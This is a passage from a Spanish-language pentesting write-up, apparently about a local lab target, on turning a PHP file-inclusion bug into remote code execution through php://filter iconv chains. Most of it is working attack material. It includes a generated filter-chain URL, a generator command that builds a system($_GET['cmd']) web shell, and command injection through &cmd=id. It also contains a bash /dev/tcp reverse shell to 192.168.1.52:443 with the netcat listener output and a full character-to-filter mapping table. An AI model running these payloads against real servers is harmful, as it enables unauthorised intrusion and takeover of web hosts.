UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Resultado:

```xml
www-data � P�������>==�@C������>...
```

Acción 6:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

```URL
http://localhost/?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=id
```

**Nota:** con `&cmd=id` podemos inyectar comandos de forma cómoda.

Acción 7: 

```URL
...&cmd=bash -c "bash -i >%26/dev/tcp/192.168.1.52/443 0>%261"
```

```bash
nc -nlvp 443
listening on [any] 443 ...

www-data@131621f61088:/var/www/html$ whoami
www-data
```

Explicación: ganamos acceso al servidor de forma remota en la máquina atacante, se podría ahora tratar de elevar privilegios si procede y mejorarnos la shell con una tty

---
# Recursos

## Filter Chains

    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
	
## Para saber más

**php://temp**

> php://temp es un flujo de lectura-escritura que permite almacenar datos temporales en una envoltura similar a un archivo. La diferencia principal entre php://temp y php://memory es que php://temp utilizará un archivo temporal en disco cuando la cantidad de datos almacenados superen el límite predefinido, que por omisión es de 2 MB.
>
> Este límite de memoria puede ser controlado añadiendo /maxmemory a la especificación de php://temp, donde NN es la cantidad en bytes máxima de datos a almacenar en memoria antes de recurrir a un archivo temporal.
> La ubicación de este archivo temporal está determinada de la misma manera que la función sys_get_temp_dir().
>
> Es importante notar que php://temp y php://memory no son reutilizables, lo que significa que después de que los flujos hayan sido cerrados, no hay forma de hacer referencia a ellos de nuevo.

Normalmente cuando implementamos un sistema de subida de imágenes con php.

Lo normal es almacenar los ficheros(imagenes) en la carpeta `/tmp` que es donde van a parar los ficheros que le enviamos por `$_FILES` automaticamente.
Mueves los ficheros(.jpg,.exe,.rar) a la carpeta donde necesites almacenarlo.
Obtiene la ruta de la imagen en el servidor y almacenarla en la base de datos.
Al tener los ficheros subidos en `/tmp` nos olvidamos de tener que borrar esos ficheros porque son temporales y se van borrando solos. El motivo por el que se van guardando hay es porque PHP tiene definido por defecto esa carpeta para la transmisión de ficheros via POST.

`$_FILES` y `$_POST` se envían en la misma petición eso es lo que tienen en común para poder transferir tanto String como Binario.

Existen formas mas complejas de enviar imagenes a php como por ejemplo convertir la imagen a base64 enviarla como String y php convertirte ese String en Binario. Evitando que ese fichero pase por `$_FILES` y todo pase por `$_POST` que serian peticiones AJAX

[Respuesta sacada parcialmente de:](https://es.stackoverflow.com/questions/177470/carpeta-temporal-de-im%C3%A1genes-en-php-y-mysql)

---

[^1]:[Herramienta para abusar de los 'Filter Chains'](https://github.com/synacktiv/php_filter_chain_generator)
